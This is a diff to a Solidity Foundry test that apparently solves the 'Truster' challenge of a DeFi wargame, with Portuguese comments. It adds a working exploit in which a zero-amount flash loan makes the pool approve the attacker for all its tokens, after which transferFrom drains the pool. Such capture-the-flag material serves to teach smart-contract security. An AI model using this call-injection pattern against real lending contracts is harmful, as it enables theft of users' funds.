@@ -41,6 +41,23 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        // 1. Criar o approve
+        bytes memory data = abi.encodeWithSignature(
+        "approve(address,uint256)",
+        attacker,
+        TOKENS_IN_POOL
+        );
+
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
+
+        // 2. ver o allowance
+        uint256 allowance = dvt.allowance(address(trusterLenderPool), attacker);
+        console.log("Allowance after approve:", allowance);
+
+        // 3. executar a transferência
+        vm.startPrank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
